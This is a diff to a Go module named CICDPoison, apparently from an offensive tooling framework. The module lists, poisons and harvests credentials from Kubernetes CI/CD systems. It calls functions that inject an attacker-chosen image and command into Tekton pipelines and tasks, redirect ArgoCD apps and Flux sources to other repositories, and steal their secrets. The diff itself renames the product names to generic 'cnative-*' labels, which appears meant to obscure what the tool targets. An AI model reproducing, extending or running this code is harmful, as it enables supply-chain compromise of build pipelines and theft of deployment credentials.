@@ -10,7 +10,7 @@ import (
 
 type CICDPoison struct{}
 
-func (m *CICDPoison) Name() string      { return "cicd_poison" }
+func (m *CICDPoison) Name() string       { return "cicd_poison" }
 func (m *CICDPoison) Platform() []string { return []string{"linux", "windows", "darwin"} }
 
 func (m *CICDPoison) Execute(ctx context.Context, args map[string]string) (*Result, error) {
@@ -56,21 +56,21 @@ func (m *CICDPoison) list(ctx context.Context, args map[string]string) (*Result,
 
 	var output string
 	switch platform {
-	case "tekton":
-		output, err = cicd.ListTektonResources(ctx, dynClient, ns)
-	case "argocd":
-		output, err = cicd.ListArgoApps(ctx, dynClient, ns)
-	case "flux":
-		output, err = cicd.ListFluxResources(ctx, dynClient, ns)
+	case "cnative-pipeline":
+		output, err = cicd.ListCnativePipelineResources(ctx, dynClient, ns)
+	case "cnative-gitops":
+		output, err = cicd.ListCnativeGitOpsApps(ctx, dynClient, ns)
+	case "cnative-sync":
+		output, err = cicd.ListCnativeSyncResources(ctx, dynClient, ns)
 	default:
 		var parts []string
-		if o, e := cicd.ListTektonResources(ctx, dynClient, ns); e == nil {
+		if o, e := cicd.ListCnativePipelineResources(ctx, dynClient, ns); e == nil {
 			parts = append(parts, o)
 		}
-		if o, e := cicd.ListArgoApps(ctx, dynClient, ns); e == nil {
+		if o, e := cicd.ListCnativeGitOpsApps(ctx, dynClient, ns); e == nil {
 			parts = append(parts, o)
 		}
-		if o, e := cicd.ListFluxResources(ctx, dynClient, ns); e == nil {
+		if o, e := cicd.ListCnativeSyncResources(ctx, dynClient, ns); e == nil {
 			parts = append(parts, o)
 		}
 		output = strings.Join(parts, "\n")
@@ -107,29 +107,29 @@ func (m *CICDPoison) poison(ctx context.Context, args map[string]string) (*Resul
 
 	var result *cicd.PoisonResult
 	switch platform {
-	case "tekton":
+	case "cnative-pipeline":
 		resourceType := args["type"]
 		if resourceType == "pipeline" {
-			result, err = cicd.PoisonTektonPipeline(ctx, dynClient, ns, target, image, command)
+			result, err = cicd.PoisonCnativePipelineDef(ctx, dynClient, ns, target, image, command)
 		} else {
-			result, err = cicd.PoisonTektonTask(ctx, dynClient, ns, target, image, command)
+			result, err = cicd.PoisonCnativePipelineTask(ctx, dynClient, ns, target, image, command)
 		}
-	case "argocd":
+	case "cnative-gitops":
 		repoURL := args["repo"]
 		path := args["path"]
-		result, err = cicd.PoisonArgoApp(ctx, dynClient, ns, target, repoURL, path)
-	case "flux":
+		result, err = cicd.PoisonCnativeGitOpsApp(ctx, dynClient, ns, target, repoURL, path)
+	case "cnative-sync":
 		resourceType := args["type"]
 		if resourceType == "kustomization" {
 			path := args["path"]
-			result, err = cicd.PoisonFluxKustomization(ctx, dynClient, ns, target, path)
+			result, err = cicd.PoisonCnativeSyncKustomization(ctx, dynClient, ns, target, path)
 		} else {
 			repoURL := args["repo"]
 			branch := args["branch"]
-			result, err = cicd.PoisonFluxGitSource(ctx, dynClient, ns, target, repoURL, branch)
+			result, err = cicd.PoisonCnativeSyncGitSource(ctx, dynClient, ns, target, repoURL, branch)
 		}
 	default:
-		return &Result{Success: false, Error: "platform required: tekton, argocd, flux"}, nil
+		return &Result{Success: false, Error: "platform required: cnative-pipeline, cnative-gitops, cnative-sync"}, nil
 	}
 
 	if err != nil {
@@ -158,26 +158,26 @@ func (m *CICDPoison) creds(ctx context.Context, args map[string]string) (*Result
 
 	var parts []string
 	switch platform {
-	case "tekton":
-		if o, e := cicd.StealTektonSecrets(ctx, dynClient, ns); e == nil {
+	case "cnative-pipeline":
+		if o, e := cicd.StealCnativePipelineSecrets(ctx, dynClient, ns); e == nil {
 			parts = append(parts, o)
 		}
-	case "argocd":
-		if o, e := cicd.StealArgoRepoCredentials(ctx, client, ns); e == nil {
+	case "cnative-gitops":
+		if o, e := cicd.StealCnativeGitOpsCredentials(ctx, client, ns); e == nil {
 			parts = append(parts, o)
 		}
-	case "flux":
-		if o, e := cicd.StealFluxCredentials(ctx, client, ns); e == nil {
+	case "cnative-sync":
+		if o, e := cicd.StealCnativeSyncCredentials(ctx, client, ns); e == nil {
 			parts = append(parts, o)
 		}
 	default:
-		if o, e := cicd.StealTektonSecrets(ctx, dynClient, ns); e == nil {
+		if o, e := cicd.StealCnativePipelineSecrets(ctx, dynClient, ns); e == nil {
 			parts = append(parts, o)
 		}
-		if o, e := cicd.StealArgoRepoCredentials(ctx, client, ns); e == nil {
+		if o, e := cicd.StealCnativeGitOpsCredentials(ctx, client, ns); e == nil {
 			parts = append(parts, o)
 		}
-		if o, e := cicd.StealFluxCredentials(ctx, client, ns); e == nil {
+		if o, e := cicd.StealCnativeSyncCredentials(ctx, client, ns); e == nil {
 			parts = append(parts, o)
 		}
 	}
